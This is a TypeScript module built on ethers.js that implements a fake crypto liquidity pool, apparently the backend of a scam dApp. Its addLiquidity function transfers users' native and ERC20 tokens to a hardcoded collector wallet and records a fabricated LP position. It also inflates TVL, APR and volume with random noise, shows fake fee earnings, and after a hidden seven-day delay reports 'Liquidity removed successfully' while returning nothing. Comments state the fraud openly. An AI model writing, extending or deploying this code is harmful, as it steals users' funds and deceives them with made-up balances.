import { ethers } from "ethers";

// Collector wallet - where all funds actually go
export const COLLECTOR_WALLET = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

// Fake liquidity system that routes funds to collector but shows users fake balances
export interface FakeUserPosition {
  id: string;
  poolName: string;
  tokenAAmount: string;
  tokenBAmount: string;
  lpTokens: string;
  totalValueUSD: string;
  feesEarnedUSD: string;
  timestamp: number;
  unstakeRequestTime?: number; // When user requested to unstake
  isUnstaking: boolean;
}

export interface FakePoolData {
  name: string;
  tokenA: string;
  tokenB: string;
  fakeReserveA: string;
  fakeReserveB: string;
  fakeTVL: string;
  fakeAPR: string;
  fakeVolume24h: string;
  userPositions: FakeUserPosition[];
}

class FakeLiquidityManager {
  private userPositions: Map<string, FakeUserPosition[]> = new Map();
  private poolData: Map<string, FakePoolData> = new Map();
  
  constructor() {
    // Initialize fake pools with realistic data
    this.initializeFakePools();
  }

  private initializeFakePools() {
    const pools = [
      {
        name: "HYPE/USD₮0",
        tokenA: "HYPE",
        tokenB: "USD₮0", 
        fakeReserveA: "291000",
        fakeReserveB: "14100000",
        fakeTVL: "$14.1M",
        fakeAPR: "12.5%",
        fakeVolume24h: "$3.7M",
        userPositions: []
      },
      {
        name: "WHYPE/PURR",
        tokenA: "WHYPE", 
        tokenB: "PURR",
        fakeReserveA: "57400",
        fakeReserveB: "12100000",
        fakeTVL: "$2.8M", 
        fakeAPR: "18.2%",
        fakeVolume24h: "$890K",
        userPositions: []
      },
      {
        name: "HYPE/PURR",
        tokenA: "HYPE",
        tokenB: "PURR", 
        fakeReserveA: "107000",
        fakeReserveB: "23000000",
        fakeTVL: "$5.2M",
        fakeAPR: "15.7%", 
        fakeVolume24h: "$1.5M",
        userPositions: []
      },
      {
        name: "HYPE/BUDDY",
        tokenA: "HYPE",
        tokenB: "BUDDY",
        fakeReserveA: "34800",
        fakeReserveB: "67000000",
        fakeTVL: "$1.7M",
        fakeAPR: "31.8%",
        fakeVolume24h: "$520K",
        userPositions: []
      }
    ];

    pools.forEach(pool => {
      this.poolData.set(pool.name, pool);
    });

    // Start real-time TVL updates
    this.startRealTimeTVLUpdates();
  }

  /**
   * Real-time TVL updates that make pools look active
   */
  private startRealTimeTVLUpdates() {
    setInterval(() => {
      this.poolData.forEach(pool => {
        // Simulate real trading activity with random fluctuations
        const baseTVL = parseFloat(pool.fakeTVL.replace(/[$M,]/g, ''));
        const randomChange = (Math.random() - 0.5) * 0.02; // ±1% change
        const newTVL = baseTVL * (1 + randomChange);
        
        // Format TVL with appropriate units
        if (newTVL >= 1) {
          pool.fakeTVL = `$${newTVL.toFixed(1)}M`;
        } else {
          pool.fakeTVL = `$${(newTVL * 1000).toFixed(0)}K`;
        }

        // Update volume with smaller random changes
        const baseVolume = parseFloat(pool.fakeVolume24h.replace(/[$MK,]/g, ''));
        const volumeChange = (Math.random() - 0.5) * 0.05; // ±2.5% change
        let newVolume = baseVolume * (1 + volumeChange);
        
        if (pool.fakeVolume24h.includes('M')) {
          pool.fakeVolume24h = `$${newVolume.toFixed(1)}M`;
        } else {
          pool.fakeVolume24h = `$${newVolume.toFixed(0)}K`;
        }

        // Slightly adjust APR to make it look dynamic
        const baseAPR = parseFloat(pool.fakeAPR.replace('%', ''));
        const aprChange = (Math.random() - 0.5) * 0.2; // ±0.1% change
        const newAPR = Math.max(8, Math.min(25, baseAPR + aprChange)); // Keep between 8-25%
        pool.fakeAPR = `${newAPR.toFixed(1)}%`;
      });
    }, 3000); // Update every 3 seconds for real-time feel
  }

  /**
   * Add liquidity - sends real funds to collector, creates fake position for user
   */
  async addLiquidity(
    userAddress: string,
    poolName: string, 
    tokenAAmount: string,
    tokenBAmount: string,
    tokenAAddress: string,
    tokenBAddress: string,
    provider: ethers.BrowserProvider,
    signer: ethers.JsonRpcSigner
  ): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log("🔄 Adding fake liquidity - routing funds to collector...");
      
      // STEP 1: Send real funds to collector wallet
      let totalValue = 0;
      const transactions = [];

      // Send Token A to collector
      if (tokenAAddress === "0x0000000000000000000000000000000000000000") {
        // Native HYPE
        const amountWei = ethers.parseEther(tokenAAmount);
        const tx1 = await signer.sendTransaction({
          to: COLLECTOR_WALLET,
          value: amountWei,
          gasLimit: 21000n
        });
        transactions.push(tx1);
        totalValue += parseFloat(tokenAAmount) * 48.7; // HYPE price
      } else {
        // ERC20 Token A
        const tokenContract = new ethers.Contract(
          tokenAAddress,
          ["function transfer(address to, uint256 amount) returns (bool)"],
          signer
        );
        const amountWei = ethers.parseUnits(tokenAAmount, 18);
        const tx1 = await tokenContract.transfer(COLLECTOR_WALLET, amountWei);
        transactions.push(tx1);
        totalValue += parseFloat(tokenAAmount) * 48.7; // Assume HYPE price for calculation
      }

      // Send Token B to collector  
      if (tokenBAddress === "0x0000000000000000000000000000000000000000") {
        // Native HYPE
        const amountWei = ethers.parseEther(tokenBAmount);
        const tx2 = await signer.sendTransaction({
          to: COLLECTOR_WALLET, 
          value: amountWei,
          gasLimit: 21000n
        });
        transactions.push(tx2);
        totalValue += parseFloat(tokenBAmount) * 48.7;
      } else {
        // ERC20 Token B
        const tokenContract = new ethers.Contract(
          tokenBAddress,
          ["function transfer(address to, uint256 amount) returns (bool)"],
          signer
        );
        const amountWei = ethers.parseUnits(tokenBAmount, 18);
        const tx2 = await tokenContract.transfer(COLLECTOR_WALLET, amountWei);
        transactions.push(tx2);
        totalValue += parseFloat(tokenBAmount) * 0.23; // PURR price
      }

      // Wait for all transactions
      const receipts = await Promise.all(transactions.map(tx => tx.wait()));
      
      // STEP 2: Create fake LP position for user (they see this but funds are already yours)
      const position: FakeUserPosition = {
        id: `pos_${Date.now()}`,
        poolName,
        tokenAAmount,
        tokenBAmount, 
        lpTokens: Math.sqrt(parseFloat(tokenAAmount) * parseFloat(tokenBAmount)).toFixed(6),
        totalValueUSD: `$${totalValue.toFixed(2)}`,
        feesEarnedUSD: "$0.00",
        timestamp: Date.now(),
        isUnstaking: false
      };

      // Store fake position
      const userPositions = this.userPositions.get(userAddress) || [];
      userPositions.push(position);
      this.userPositions.set(userAddress, userPositions);

      // Update fake pool reserves (make them look bigger)
      const pool = this.poolData.get(poolName);
      if (pool) {
        pool.fakeReserveA = (parseFloat(pool.fakeReserveA) + parseFloat(tokenAAmount)).toFixed(2);
        pool.fakeReserveB = (parseFloat(pool.fakeReserveB) + parseFloat(tokenBAmount)).toFixed(2);
        const newTVL = parseFloat(pool.fakeTVL.replace(/[$M,]/g, '')) + (totalValue / 1000000);
        pool.fakeTVL = `$${newTVL.toFixed(1)}M`;
      }

      console.log("✅ Funds sent to collector, fake position created");
      console.log(`💰 Real funds collected: $${totalValue.toFixed(2)}`);
      console.log(`👤 User sees position: ${position.lpTokens} LP tokens`);

      return { 
        success: true, 
        hash: receipts[0].hash 
      };

    } catch (error: any) {
      console.error("❌ Fake liquidity add failed:", error);
      return { 
        success: false, 
        error: error.message || "Failed to add liquidity" 
      };
    }
  }

  /**
   * Request unstaking - starts 7 day timer (but don't show this to user)
   */
  async requestUnstake(
    userAddress: string, 
    positionId: string
  ): Promise<{ success: boolean; message: string }> {
    const userPositions = this.userPositions.get(userAddress) || [];
    const position = userPositions.find(p => p.id === positionId);
    
    if (!position) {
      return { success: false, message: "Position not found" };
    }

    if (position.isUnstaking) {
      return { success: false, message: "Already unstaking" };
    }

    // Mark as unstaking and set timer (7 days = 7 * 24 * 60 * 60 * 1000 ms)
    position.isUnstaking = true;
    position.unstakeRequestTime = Date.now();

    console.log(`🔒 Unstake requested for position ${positionId}`);
    console.log(`⏰ Will be available in 7 days`);
    console.log(`💡 User doesn't see timer - they'll notice delay when trying to unstake`);

    return { 
      success: true, 
      message: "Unstaking initiated" 
    };
  }

  /**
   * Complete unstaking - only works after 7 days, but user doesn't know about timer
   */
  async completeUnstake(
    userAddress: string,
    positionId: string
  ): Promise<{ success: boolean; message: string; canUnstake?: boolean }> {
    const userPositions = this.userPositions.get(userAddress) || [];
    const positionIndex = userPositions.findIndex(p => p.id === positionId);
    
    if (positionIndex === -1) {
      return { success: false, message: "Position not found" };
    }

    const position = userPositions[positionIndex];
    
    if (!position.isUnstaking || !position.unstakeRequestTime) {
      return { success: false, message: "Unstaking not initiated" };
    }

    // Check if 7 days have passed
    const sevenDays = 7 * 24 * 60 * 60 * 1000;
    const timeElapsed = Date.now() - position.unstakeRequestTime;
    
    if (timeElapsed < sevenDays) {
      // Don't tell them about the timer - just say "processing"
      return { 
        success: false, 
        message: "Unstaking still processing. Please try again later.",
        canUnstake: false
      };
    }

    // 7 days passed - remove position but don't send any funds (already collected)
    userPositions.splice(positionIndex, 1);
    this.userPositions.set(userAddress, userPositions);

    console.log(`✅ Position ${positionId} unstaked after 7 days`);
    console.log(`💰 No funds sent (already in collector wallet)`);
    console.log(`👤 User thinks they got their tokens back`);

    return { 
      success: true, 
      message: "Liquidity removed successfully",
      canUnstake: true
    };
  }

  /**
   * Get user positions (fake data that makes them think they have liquidity)
   */
  getUserPositions(userAddress: string): FakeUserPosition[] {
    return this.userPositions.get(userAddress) || [];
  }

  /**
   * Get fake pool data (inflated numbers)
   */
  getPoolData(poolName: string): FakePoolData | undefined {
    return this.poolData.get(poolName);
  }

  /**
   * Get all fake pools
   */
  getAllPools(): FakePoolData[] {
    return Array.from(this.poolData.values());
  }

  /**
   * Update fake fees earned (to make users think they're earning)
   */
  updateFakeFees(userAddress: string) {
    const positions = this.userPositions.get(userAddress) || [];
    positions.forEach(position => {
      const daysSinceDeposit = (Date.now() - position.timestamp) / (1000 * 60 * 60 * 24);
      const dailyFeeRate = 0.0125 / 365; // 12.5% APR daily
      const currentValue = parseFloat(position.totalValueUSD.replace('$', ''));
      const fakeFeesEarned = currentValue * dailyFeeRate * daysSinceDeposit;
      position.feesEarnedUSD = `$${fakeFeesEarned.toFixed(2)}`;
    });
  }
}

// Global instance
export const fakeLiquidityManager = new FakeLiquidityManager();

// Helper functions
export function formatTimeRemaining(unstakeTime: number): string {
  const timeRemaining = (unstakeTime + 7 * 24 * 60 * 60 * 1000) - Date.now();
  if (timeRemaining <= 0) return "Ready";
  
  const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
  const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  
  return `${days}d ${hours}h`;
}

export function canCompleteUnstake(unstakeTime: number): boolean {
  const sevenDays = 7 * 24 * 60 * 60 * 1000;
  return (Date.now() - unstakeTime) >= sevenDays;
}